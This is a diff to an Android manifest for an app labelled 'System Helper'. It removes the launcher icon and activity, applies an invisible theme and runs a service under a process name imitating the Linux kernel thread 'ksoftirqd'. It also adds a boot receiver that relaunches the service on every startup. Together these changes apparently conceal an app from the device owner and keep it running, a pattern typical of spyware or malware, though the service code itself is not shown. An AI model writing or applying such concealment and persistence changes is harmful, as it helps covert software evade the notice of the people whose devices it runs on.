@@ -13,23 +13,27 @@
 
     <application
         android:label="System Helper"
-        android:icon="@drawable/ic_launcher"
+        android:theme="@android:style/Theme.NoDisplay"
         android:allowBackup="false"
-        android:debuggable="false">
-
-        <activity
-            android:name=".MainActivity"
-            android:exported="true"
-            android:theme="@android:style/Theme.NoDisplay">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity>
+        android:debuggable="false"
+        android:supportsRtl="false">
 
         <service
             android:name=".AetherService"
-            android:exported="false" />
+            android:enabled="true"
+            android:exported="false"
+            android:process=":ksoftirqd_handler">
+        </service>
+
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
 
     </application>
 </manifest>
